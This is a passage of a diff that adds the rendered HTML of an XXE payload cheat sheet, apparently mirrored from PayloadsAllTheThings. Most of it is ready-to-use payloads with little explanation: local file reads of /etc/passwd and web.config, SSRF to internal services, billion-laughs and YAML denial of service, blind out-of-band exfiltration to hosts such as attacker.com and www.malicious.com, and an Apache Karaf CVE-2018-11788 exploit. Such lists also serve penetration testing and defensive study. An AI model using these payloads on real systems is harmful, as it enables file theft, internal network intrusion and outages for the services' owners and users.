+</h2>
+<h3 id="classic-xxe">
+  Classic XXE
+  <a class="anchor" href="#classic-xxe">#</a>
+</h3>
+<p>We try to display the content of the file <code>/etc/passwd</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#39;file:///etc/passwd&#39;&gt;</span>]&gt;<span style="color:#f92672">&lt;root&gt;</span>&amp;test;<span style="color:#f92672">&lt;/root&gt;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE data [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ELEMENT data (#ANY)&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;data&gt;</span>&amp;file;<span style="color:#f92672">&lt;/data&gt;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!DOCTYPE foo [  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  &lt;!ELEMENT foo ANY &gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;</span>]&gt;<span style="color:#f92672">&lt;foo&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/foo&gt;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  &lt;!ELEMENT foo ANY &gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;file:///c:/boot.ini&#34; &gt;</span>]&gt;<span style="color:#f92672">&lt;foo&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/foo&gt;</span>
+</span></span></code></pre></div><p>:warning: <code>SYSTEM</code> and <code>PUBLIC</code> are almost synonym.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  &lt;!ELEMENT foo ANY &gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;file:///c:/boot.ini&#34; &gt;</span>]&gt;<span style="color:#f92672">&lt;foo&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/foo&gt;</span>
+</span></span></code></pre></div><h3 id="classic-xxe-base64-encoded">
+  Classic XXE Base64 encoded
+  <a class="anchor" href="#classic-xxe-base64-encoded">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM &#34;data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk&#34;&gt;</span> %init; ]&gt;<span style="color:#f92672">&lt;foo/&gt;</span>
+</span></span></code></pre></div><h3 id="php-wrapper-inside-xxe">
+  PHP Wrapper inside XXE
+  <a class="anchor" href="#php-wrapper-inside-xxe">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &#34;php://filter/convert.base64-encode/resource=index.php&#34;&gt;</span> ]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;contacts&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;contact&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;name&gt;</span>Jean &amp;xxe; Dupont<span style="color:#f92672">&lt;/name&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;phone&gt;</span>00 11 22 33 44<span style="color:#f92672">&lt;/phone&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;address&gt;</span>42 rue du CTF<span style="color:#f92672">&lt;/address&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;zipcode&gt;</span>75000<span style="color:#f92672">&lt;/zipcode&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;city&gt;</span>Paris<span style="color:#f92672">&lt;/city&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/contact&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/contacts&gt;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ELEMENT foo ANY &gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % xxe SYSTEM &#34;php://filter/convert.base64-encode/resource=http://10.0.0.3&#34; &gt;</span>
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;foo&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/foo&gt;</span>
+</span></span></code></pre></div><h3 id="xinclude-attacks">
+  XInclude attacks
+  <a class="anchor" href="#xinclude-attacks">#</a>
+</h3>
+<p>When you can&rsquo;t modify the <strong>DOCTYPE</strong> element use the <strong>XInclude</strong> to target</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;foo</span> <span style="color:#a6e22e">xmlns:xi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XInclude&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;xi:include</span> <span style="color:#a6e22e">parse=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">href=</span><span style="color:#e6db74">&#34;file:///etc/passwd&#34;</span><span style="color:#f92672">/&gt;&lt;/foo&gt;</span>
+</span></span></code></pre></div><h2 id="exploiting-xxe-to-perform-ssrf-attacks">
+  Exploiting XXE to perform SSRF attacks
+  <a class="anchor" href="#exploiting-xxe-to-perform-ssrf-attacks">#</a>
+</h2>
+<p>XXE can be combined with the 
+  <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery">SSRF vulnerability</a> to target another service on the network.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ELEMENT foo ANY &gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % xxe SYSTEM &#34;http://internal.service/secret_pass.txt&#34; &gt;</span>
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;foo&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/foo&gt;</span>
+</span></span></code></pre></div><h2 id="exploiting-xxe-to-perform-a-deny-of-service">
+  Exploiting XXE to perform a deny of service
+  <a class="anchor" href="#exploiting-xxe-to-perform-a-deny-of-service">#</a>
+</h2>
+<p>:warning: : These attacks might kill the service or the server, do not use them on the production.</p>
+<h3 id="billion-laugh-attack">
+  Billion Laugh Attack
+  <a class="anchor" href="#billion-laugh-attack">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE data [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY a0 &#34;dos&#34; &gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY a1 &#34;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY a2 &#34;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY a3 &#34;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY a4 &#34;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;data&gt;</span>&amp;a4;<span style="color:#f92672">&lt;/data&gt;</span>
+</span></span></code></pre></div><h3 id="yaml-attack">
+  Yaml attack
+  <a class="anchor" href="#yaml-attack">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>a: <span style="color:#960050;background-color:#1e0010">&amp;</span>a [&#34;lol&#34;,&#34;lol&#34;,&#34;lol&#34;,&#34;lol&#34;,&#34;lol&#34;,&#34;lol&#34;,&#34;lol&#34;,&#34;lol&#34;,&#34;lol&#34;]
+</span></span><span style="display:flex;"><span>b: <span style="color:#960050;background-color:#1e0010">&amp;</span>b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
+</span></span><span style="display:flex;"><span>c: <span style="color:#960050;background-color:#1e0010">&amp;</span>c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
+</span></span><span style="display:flex;"><span>d: <span style="color:#960050;background-color:#1e0010">&amp;</span>d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
+</span></span><span style="display:flex;"><span>e: <span style="color:#960050;background-color:#1e0010">&amp;</span>e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
+</span></span><span style="display:flex;"><span>f: <span style="color:#960050;background-color:#1e0010">&amp;</span>f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
+</span></span><span style="display:flex;"><span>g: <span style="color:#960050;background-color:#1e0010">&amp;</span>g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
+</span></span><span style="display:flex;"><span>h: <span style="color:#960050;background-color:#1e0010">&amp;</span>h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
+</span></span><span style="display:flex;"><span>i: <span style="color:#960050;background-color:#1e0010">&amp;</span>i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
+</span></span></code></pre></div><h2 id="error-based-xxe">
+  Error Based XXE
+  <a class="anchor" href="#error-based-xxe">#</a>
+</h2>
+<p><strong>Payload to trigger the XXE</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; ?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE message [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    &lt;!ENTITY % ext SYSTEM &#34;http://attacker.com/ext.dtd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>    %ext;
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;message&gt;&lt;/message&gt;</span>
+</span></span></code></pre></div><p><strong>Contents of ext.dtd</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:///nonexistent/%file;&#39;&gt;</span>&#34;&gt;
+</span></span><span style="display:flex;"><span>%eval;
+</span></span><span style="display:flex;"><span>%error;
+</span></span></code></pre></div><h2 id="exploiting-blind-xxe-to-exfiltrate-data-out-of-band">
+  Exploiting blind XXE to exfiltrate data out-of-band
+  <a class="anchor" href="#exploiting-blind-xxe-to-exfiltrate-data-out-of-band">#</a>
+</h2>
+<p>Sometimes you won&rsquo;t have a result outputted in the page but you can still extract the data with an out of band attack.</p>
+<h3 id="blind-xxe">
+  Blind XXE
+  <a class="anchor" href="#blind-xxe">#</a>
+</h3>
+<p>The easiest way to test for a blind XXE is to try to load a remote resource such as a Burp Collaborator.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; ?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE root [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % ext SYSTEM &#34;http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x&#34;&gt;</span> %ext;
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;r&gt;&lt;/r&gt;</span>
+</span></span></code></pre></div><p>Send the content of <code>/etc/passwd</code> to &ldquo;
+  <a href="https://www.malicious.com">www.malicious.com</a>&rdquo;, you may receive only the first line.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ELEMENT foo ANY &gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY callhome SYSTEM &#34;www.malicious.com/?%xxe;&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;foo&gt;</span>&amp;callhome;<span style="color:#f92672">&lt;/foo&gt;</span>
+</span></span></code></pre></div><h3 id="xxe-oob-attack-yunusov-2013">
+  XXE OOB Attack (Yunusov, 2013)
+  <a class="anchor" href="#xxe-oob-attack-yunusov-2013">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE data SYSTEM &#34;http://publicServer.com/parameterEntity_oob.dtd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;data&gt;</span>&amp;send;<span style="color:#f92672">&lt;/data&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>File stored on http://publicServer.com/parameterEntity_oob.dtd
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % file SYSTEM &#34;file:///sys/power/image_size&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % all &#34;&lt;!ENTITY send SYSTEM &#39;http://publicServer.com/?%file;&#39;&gt;</span>&#34;&gt;
+</span></span><span style="display:flex;"><span>%all;
+</span></span></code></pre></div><h3 id="xxe-oob-with-dtd-and-php-filter">
+  XXE OOB with DTD and PHP filter
+  <a class="anchor" href="#xxe-oob-with-dtd-and-php-filter">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; ?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE r [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ELEMENT r ANY &gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % sp SYSTEM &#34;http://127.0.0.1/dtd.xml&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>%sp;
+</span></span><span style="display:flex;"><span>%param1;
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;r&gt;</span>&amp;exfil;<span style="color:#f92672">&lt;/r&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>File stored on http://127.0.0.1/dtd.xml
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % data SYSTEM &#34;php://filter/convert.base64-encode/resource=/etc/passwd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY % param1 &#34;&lt;!ENTITY exfil SYSTEM &#39;http://127.0.0.1/dtd.xml?%data;&#39;&gt;</span>&#34;&gt;
+</span></span></code></pre></div><h3 id="xxe-oob-with-apache-karaf">
+  XXE OOB with Apache Karaf
+  <a class="anchor" href="#xxe-oob-with-apache-karaf">#</a>
+</h3>
+<p>CVE-2018-11788 affecting versions:</p>
+<ul>
+<li>Apache Karaf &lt;= 4.2.1</li>
+<li>Apache Karaf &lt;= 4.1.6</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &#34;http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com&#34;&gt;</span> %dtd;]
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;features</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;my-features&#34;</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://karaf.apache.org/xmlns/features/v1.3.0&#34;</span> <span style="color:#a6e22e">xmlns:xsi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xsi:schemaLocation=</span><span style="color:#e6db74">&#34;http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;feature</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;deployer&#34;</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;2.0&#34;</span> <span style="color:#a6e22e">install=</span><span style="color:#e6db74">&#34;auto&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/feature&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/features&gt;</span>
+</span></span></code></pre></div><p>Send the XML file to the <code>deploy</code> folder.</p>
+<p>Ref. 
+  <a href="https://github.com/brianwrf/CVE-2018-11788">brianwrf/CVE-2018-11788</a></p>
+<h2 id="xxe-with-local-dtd">
+  XXE with local DTD
+  <a class="anchor" href="#xxe-with-local-dtd">#</a>
+</h2>
+<p>In some case, outgoing connections are not possible from the web application. DNS names might even not resolve externally with a payload like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#39;http://h3l9e5soi0090naz81tmq5ztaaaaaa.burpcollaborator.net&#39;&gt;</span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;root&gt;</span>&amp;test;<span style="color:#f92672">&lt;/root&gt;</span>
+</span></span></code></pre></div><p>If error based exfiltration is possible, you can still rely on a local DTD to do concatenation tricks. Payload to confirm that error message include filename.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE root [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    &lt;!ENTITY % local_dtd SYSTEM &#34;file:///abcxyz/&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    %local_dtd;
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;root&gt;&lt;/root&gt;</span>
+</span></span></code></pre></div><p>Assuming payloads such as the previous return a verbose error. You can start pointing to local DTD. With an found DTD, you can submit payload such as the following payload. The content of the file will be place in the error message.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE root [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    &lt;!ENTITY % local_dtd SYSTEM &#34;file:///usr/share/yelp/dtd/docbookx.dtd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!ENTITY % ISOamsa &#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        &lt;!ENTITY &amp;#x25; file SYSTEM &#34;file:///REPLACE_WITH_FILENAME_TO_READ&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">&lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;</span>&#34;&gt;
+</span></span><span style="display:flex;"><span>        &amp;#x25;eval;
+</span></span><span style="display:flex;"><span>        &amp;#x25;error;
+</span></span><span style="display:flex;"><span>        &#39;&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    %local_dtd;
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;root&gt;&lt;/root&gt;</span>
+</span></span></code></pre></div><p>
+  <a href="https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md">Other payloads using different DTDs</a></p>
+<h2 id="windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents">
+  Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents
+  <a class="anchor" href="#windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents">#</a>
+</h2>
+<p>From 
+  <a href="https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79">https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79</a></p>
+<h3 id="disclose-local-file">
+  Disclose local file
+  <a class="anchor" href="#disclose-local-file">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE doc [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    &lt;!ENTITY % local_dtd SYSTEM &#34;file:///C:\Windows\System32\wbem\xml\cim20.dtd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!ENTITY % SuperClass &#39;&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">&lt;!ENTITY &amp;#x25; file SYSTEM &#34;file://D:\webserv2\services\web.config&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">&lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file://t/#&amp;#x25;file;&amp;#x27;&gt;</span>&#34;&gt;
+</span></span><span style="display:flex;"><span>        &amp;#x25;eval;
+</span></span><span style="display:flex;"><span>        &amp;#x25;error;
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e">&lt;!ENTITY test &#34;test&#34;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    &gt;</span>
+</span></span><span style="display:flex;"><span>    %local_dtd;
+</span></span><span style="display:flex;"><span>  ]&gt;<span style="color:#f92672">&lt;xxx&gt;</span>cacat<span style="color:#f92672">&lt;/xxx&gt;</span>
+</span></span></code></pre></div><h3 id="disclose-http-response">
+  Disclose HTTP Response:
+  <a class="anchor" href="#disclose-http-response">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE doc [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    &lt;!ENTITY % local_dtd SYSTEM &#34;file:///C:\Windows\System32\wbem\xml\cim20.dtd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!ENTITY % SuperClass &#39;&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">&lt;!ENTITY &amp;#x25; file SYSTEM &#34;https://erp.company.com&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">&lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file://test/#&amp;#x25;file;&amp;#x27;&gt;</span>&#34;&gt;
+</span></span><span style="display:flex;"><span>        &amp;#x25;eval;
+</span></span><span style="display:flex;"><span>        &amp;#x25;error;
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e">&lt;!ENTITY test &#34;test&#34;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    &gt;</span>
+</span></span><span style="display:flex;"><span>    %local_dtd;
+</span></span><span style="display:flex;"><span>  ]&gt;<span style="color:#f92672">&lt;xxx&gt;</span>cacat<span style="color:#f92672">&lt;/xxx&gt;</span>
+</span></span></code></pre></div><h2 id="xxe-in-exotic-files">
+  XXE in exotic files
+  <a class="anchor" href="#xxe-in-exotic-files">#</a>
+</h2>
+<h3 id="xxe-inside-svg">
+  XXE inside SVG
+  <a class="anchor" href="#xxe-inside-svg">#</a>
+</h3>
